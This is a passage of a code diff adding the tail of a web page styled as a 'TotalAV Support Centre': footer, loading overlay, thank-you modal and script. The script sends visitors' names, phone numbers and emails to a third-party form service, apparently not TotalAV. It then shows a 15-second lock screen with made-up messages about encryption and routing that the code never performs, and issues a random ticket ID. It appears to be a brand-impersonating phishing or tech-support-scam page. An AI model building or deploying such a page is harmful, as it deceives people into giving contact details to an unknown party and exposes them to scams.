+                        <li><a href="https://login.totalav.com" target="_blank" class="hover:text-white transition-colors">Dashboard Login</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-3">Support Hours</h4>
+                    <ul class="space-y-2">
+                        <li><i class="fa-solid fa-clock text-totalav-red mr-1.5"></i> Live Chat: 24/7 Available</li>
+                        <li><i class="fa-solid fa-envelope text-totalav-red mr-1.5"></i> Email Assistance: Active</li>
+                        <li><i class="fa-solid fa-shield text-emerald-400 mr-1.5"></i> 256-Bit SSL Secured</li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-3">System Status</h4>
+                    <div class="p-3 bg-slate-800 border border-slate-700 rounded-xl space-y-1">
+                        <div class="flex items-center gap-2 text-white font-bold text-xs">
+                            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+                            <span>All Servers Operational</span>
+                        </div>
+                        <p class="text-[11px] text-slate-400">Activation servers & chat services are operating normally.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex flex-col sm:flex-row justify-between items-center gap-4 text-[11px] text-slate-500">
+                <p>&copy; 2026 TotalAV Support Centre. All Rights Reserved.</p>
+                <div class="flex space-x-6">
+                    <a href="#" class="hover:underline">Privacy Policy</a>
+                    <a href="#" class="hover:underline">Terms & Conditions</a>
+                    <a href="#" class="hover:underline">Uninstall Guide</a>
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
+    <div id="fullscreen-loading" class="fixed inset-0 z-[100] bg-slate-950/90 backdrop-blur-md flex flex-col items-center justify-center text-white hidden select-none pointer-events-auto">
+        <div class="max-w-md w-full px-6 py-8 text-center space-y-6 bg-slate-900/95 border border-slate-800 rounded-3xl shadow-2xl relative overflow-hidden mx-4">
+            
+            <!-- Dynamic Top Loading Bar -->
+            <div id="loading-progress-bar" class="absolute top-0 left-0 h-1.5 bg-gradient-to-r from-totalav-red via-rose-400 to-emerald-400 transition-all duration-1000 ease-linear w-0"></div>
+            
+            <div class="relative flex justify-center items-center py-2">
+                <div class="w-24 h-24 rounded-full border-4 border-totalav-red/20 border-t-totalav-red animate-spin flex items-center justify-center"></div>
+                <div class="absolute w-16 h-16 bg-totalav-red/10 rounded-full flex items-center justify-center">
+                    <i class="fa-solid fa-shield-halved text-3xl text-totalav-red pulse-shield-icon"></i>
+                </div>
+            </div>
+
+            <div class="space-y-2">
+                <span class="inline-block px-3 py-1 rounded-full text-[11px] font-semibold bg-rose-950/80 text-rose-300 border border-rose-800/50 uppercase tracking-wider">
+                    <i class="fa-solid fa-lock text-rose-400 mr-1"></i> 256-Bit SSL Verification
+                </span>
+                <h3 class="text-xl font-bold text-white">Validating TotalAV Ticket</h3>
+                <p id="loading-status-text" class="text-xs text-slate-300 min-h-[2.5rem] flex items-center justify-center px-2 font-medium">
+                    Initializing secure connection to TotalAV servers...
+                </p>
+            </div>
+
+            <!-- Countdown Timer Display -->
+            <div class="bg-slate-800/80 rounded-2xl p-4 border border-slate-700/60">
+                <div class="text-4xl font-black font-mono text-white tracking-widest" id="countdown-timer">15</div>
+                <div class="text-[10px] text-slate-400 uppercase tracking-widest mt-1 font-semibold">Seconds Remaining</div>
+            </div>
+
+            <div class="text-[11px] text-slate-400 flex items-center justify-center gap-2">
+                <i class="fa-solid fa-spinner animate-spin text-totalav-red"></i>
+                <span>Please do not refresh or close this window</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="thank-you-screen" class="fixed inset-0 z-[100] bg-slate-950/95 backdrop-blur-lg flex items-center justify-center p-4 hidden">
+        <div class="max-w-lg w-full bg-white rounded-3xl p-6 sm:p-8 shadow-2xl text-slate-800 relative border border-slate-100 text-center space-y-6">
+            <div class="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full mx-auto flex items-center justify-center text-3xl shadow-inner">
+                <i class="fa-solid fa-check text-4xl"></i>
+            </div>
+
+            <div class="space-y-2">
+                <span class="inline-block px-3 py-1 rounded-full text-xs font-bold bg-emerald-100 text-emerald-800 uppercase tracking-wider">
+                    Submission Received
+                </span>
+                <h2 class="text-2xl sm:text-3xl font-black text-slate-900">Thank You For Your Submission!</h2>
+                <p class="text-xs sm:text-sm text-slate-600">
+                    Your TotalAV support ticket and product key request have been transmitted successfully.
+                </p>
+            </div>
+
+            <!-- Summary Box -->
+            <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-left space-y-2 text-xs text-slate-700">
+                <div class="flex justify-between pb-2 border-b border-slate-200">
+                    <span class="text-slate-500 font-medium">Reference Ticket ID:</span>
+                    <span id="summary-ref" class="font-mono font-bold text-slate-900">TAV-9182-X77</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Full Name:</span>
+                    <span id="summary-name" class="font-semibold text-slate-800">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Phone Number:</span>
+                    <span id="summary-phone" class="font-semibold text-slate-800">-</span>
+                </div>
+                <div class="flex justify-between">
+                    <span class="text-slate-500 font-medium">Account Email:</span>
+                    <span id="summary-email" class="font-semibold text-slate-800">-</span>
+                </div>
+            </div>
+
+            <div class="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-left flex items-start gap-3">
+                <i class="fa-solid fa-shield-virus text-totalav-red text-lg mt-0.5"></i>
+                <div class="text-xs text-rose-950">
+                    <p class="font-bold">Next Steps:</p>
+                    <p class="mt-0.5 text-rose-800">Our support team has logged your ticket. A representative will contact you via email shortly.</p>
+                </div>
+            </div>
+
+            <button onclick="closeThankYouScreen()" class="w-full py-3.5 px-4 bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold rounded-xl transition-all shadow-md">
+                <i class="fa-solid fa-arrow-left mr-1.5"></i> Return to TotalAV Support Centre
+            </button>
+        </div>
+    </div>
+
+    <script>
+        function fillSearch(keyword) {
+            const searchInput = document.getElementById('search-input');
+            searchInput.value = keyword;
+            handleSearch(keyword);
+            searchInput.focus();
+        }
+
+        // Handle Web3Forms Submission & 15-Second Non-Interactive Loading Screen
+        async function processTicketSubmission(e) {
+            if (e) e.preventDefault();
+
+            const form = document.getElementById('totalav-support-form');
+            const nameInput = document.getElementById('user-name').value.trim();
+            const phoneInput = document.getElementById('user-phone').value.trim();
+            const emailInput = document.getElementById('user-email').value.trim();
+
+            if (!nameInput) {
+                showToast('Please enter your full name.', 'error');
+                return;
+            }
+            if (!phoneInput) {
+                showToast('Please enter your phone number.', 'error');
+                return;
+            }
+            if (!emailInput || !emailInput.includes('@')) {
+                showToast('Please enter a valid email address.', 'error');
+                return;
+            }
+
+            // Post to Web3Forms API asynchronously
+            const formData = new FormData(form);
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.error('Web3Forms Submit Error:', err));
+
+            // Launch 15-second lock screen
+            const loadingOverlay = document.getElementById('fullscreen-loading');
+            const countdownEl = document.getElementById('countdown-timer');
+            const progressBar = document.getElementById('loading-progress-bar');
+            const statusText = document.getElementById('loading-status-text');
+
+            loadingOverlay.classList.remove('hidden');
+            document.body.classList.add('overflow-hidden');
+
+            let secondsLeft = 15;
+            const totalDuration = 15;
+
+            const statusMessages = [
+                { time: 15, text: "Connecting to TotalAV secure support server..." },
+                { time: 12, text: "Encrypting 256-bit SSL ticket submission payload..." },
+                { time: 9, text: "Routing ticket to priority support queue..." },
+                { time: 6, text: "Linking account details with support queue..." },
+                { time: 3, text: "Finalizing support ticket and generating reference ID..." }
+            ];
+
+            countdownEl.innerText = secondsLeft;
+            progressBar.style.width = '0%';
+
+            const timerInterval = setInterval(() => {
+                secondsLeft--;
+                countdownEl.innerText = secondsLeft;
+
+                const elapsed = totalDuration - secondsLeft;
+                const progressPercent = Math.min(100, Math.round((elapsed / totalDuration) * 100));
+                progressBar.style.width = `${progressPercent}%`;
+
+                const currentMsg = statusMessages.find(m => m.time === secondsLeft || (secondsLeft < m.time && secondsLeft > m.time - 3));
+                if (currentMsg) {
+                    statusText.innerText = currentMsg.text;
+                }
+
+                if (secondsLeft <= 0) {
+                    clearInterval(timerInterval);
+
+                    loadingOverlay.classList.add('hidden');
+                    document.body.classList.remove('overflow-hidden');
+
+                    // Populate Thank You Summary modal
+                    const refCode = 'TAV-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
+                    document.getElementById('summary-ref').innerText = refCode;
+                    document.getElementById('summary-name').innerText = nameInput;
+                    document.getElementById('summary-phone').innerText = phoneInput;
+                    document.getElementById('summary-email').innerText = emailInput;
+
+                    // Display Thank You Modal
+                    document.getElementById('thank-you-screen').classList.remove('hidden');
+
+                    // Reset Form
+                    form.reset();
+                }
+            }, 1000);
+        }
+
+        function closeThankYouScreen() {
+            document.getElementById('thank-you-screen').classList.add('hidden');
+        }
+
+        // Live Knowledge Search simulation
+        const articlesList = [
+            { title: "How to Enable Real-Time Protection", category: "Technical Support" },
+            { title: "Resetting Your TotalAV Account Password", category: "Account Support" },
+            { title: "Adding Additional Devices to Subscription", category: "Device Setup" },
+            { title: "Managing Renewal & Billing Settings", category: "Billing" },
+            { title: "Stopping Intrusive Push Notifications", category: "Web Protection" },
+            { title: "Installing WebShield Extension", category: "WebShield" }
+        ];
+
+        function handleSearch(query) {
+            const resultsBox = document.getElementById('search-results');
+            const q = query.toLowerCase().trim();
+
+            if (!q) {
+                resultsBox.classList.add('hidden');
+                return;
+            }
+
+            const matches = articlesList.filter(a => a.title.toLowerCase().includes(q) || a.category.toLowerCase().includes(q));
+
+            if (matches.length === 0) {
+                resultsBox.innerHTML = '<div class="p-4 text-xs text-slate-500">No matching guides found. Try searching for "protection", "key", or "billing".</div>';
+            } else {
+                resultsBox.innerHTML = matches.map(m => `
+                    <div onclick="openArticleModal('${m.title}', 'Detailed guide on ${m.title}.')" class="p-3.5 hover:bg-slate-50 border-b border-slate-100 cursor-pointer flex justify-between items-center text-xs">
+                        <span class="font-semibold text-slate-800">${m.title}</span>
+                        <span class="text-[10px] text-totalav-red bg-totalav-lightRed px-2 py-0.5 rounded font-bold">${m.category}</span>
+                    </div>
+                `).join('');
+            }
+            resultsBox.classList.remove('hidden');
+        }
+
+        function executeSearch() {
+            const input = document.getElementById('search-input').value;
+            if (input) {
+                handleSearch(input);
+            }
+        }
+
+        function selectCategory(catName) {
+            showToast(`Filtering support for: ${catName}`, 'info');
+            document.getElementById('quick-guides').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function openArticleModal(title, content) {
+            document.getElementById('article-title').innerText = title;
+            document.getElementById('article-content').innerText = content;
+            document.getElementById('article-modal').classList.remove('hidden');
+            document.getElementById('article-modal').classList.add('flex');
+        }
+
+        function closeArticleModal() {
+            document.getElementById('article-modal').classList.add('hidden');
+            document.getElementById('article-modal').classList.remove('flex');
+        }
+
+        function toggleFaq(index) {
+            const body = document.getElementById(`faq-body-${index}`);
+            const icon = document.getElementById(`faq-icon-${index}`);
+            
+            if (body.classList.contains('hidden')) {
+                body.classList.remove('hidden');
+                icon.style.transform = 'rotate(180deg)';
+            } else {
+                body.classList.add('hidden');
+                icon.style.transform = 'rotate(0deg)';
+            }
+        }
+
+        function toggleMobileMenu() {
+            document.getElementById('mobile-menu').classList.toggle('hidden');
+        }
+
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            let bgColor = 'bg-slate-900';
+            if (type === 'error') bgColor = 'bg-rose-600';
+            if (type === 'success') bgColor = 'bg-emerald-600';
+
+            toast.className = `fixed top-20 right-4 z-50 ${bgColor} text-white px-4 py-3 rounded-xl shadow-xl text-xs font-bold flex items-center gap-2 transition-all duration-300 transform translate-y-0`;
+            toast.innerHTML = `<i class="fa-solid fa-circle-info"></i> ${message}`;
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('opacity-0', '-translate-y-2');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
